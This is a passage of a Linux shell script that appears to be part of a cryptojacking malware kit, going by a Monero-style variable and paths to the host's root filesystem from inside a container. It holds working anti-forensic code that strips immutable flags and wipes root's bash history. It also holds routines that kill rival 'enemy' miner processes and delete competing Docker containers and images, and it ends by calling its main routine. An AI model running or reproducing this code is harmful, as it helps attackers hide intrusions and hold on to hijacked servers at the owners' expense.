fi



unset XMR_UP
history -c
if [ -f "/host/root/.bash_history" ]; then chattr -ia /host/ /host/root/ /host/root/.bash_history; rm -fr /host/root/.bash_history; touch /host/root/.bash_history; fi
if [ -f "/root/.bash_history" ]; then chattr -ia /root/ /root/.bash_history; rm -fr /root/.bash_history; touch /root/.bash_history; fi
}


function cleanrou(){
BINPATH=$1
if [ -f "$BINPATH" ]; then echo "FOUND! enemy file " $BINPATH; ENEMYPID=`pidof $BINPATH`
chattr -ia $BINPATH 2>/dev/null ; chmod 1777 $BINPATH 2>/dev/null ; rm -fr $BINPATH 2>/dev/null
if [ ! -z "$ENEMYPID" ]; then kill $ENEMYPID 2>/dev/null; pkill $BINPATH 2>/dev/null; fi
if [ ! -f "$BINPATH" ]; then echo "OKAY! cleanup " $BINPATH; else echo "FAIL! cleanup " $BINPATH; fi ; fi
}

function clean_docker(){
lookfor=$1
BDCONTAINER=`docker ps | grep $lookfor | awk '{print $1}'`
BDIMAGE=`docker container ps | grep $lookfor | awk '{print $2}'`
if [ ! -z "$BDCONTAINER" ]; then docker stop $BDCONTAINER 2>/dev/null ; docker rm $BDCONTAINER -f 2>/dev/null ; docker rm $BDCONTAINER 2>/dev/null ; fi
if [ ! -z "$BDIMAGE" ]; then docker rmi $BDIMAGE -f 2>/dev/null ; docker rmi $BDIMAGE 2>/dev/null ; fi
unset BDCONTAINER 2>/dev/null ; unset BDIMAGE 2>/dev/null ; unset lookfor 2>/dev/null ; history -c 2>/dev/null 
}





init_main
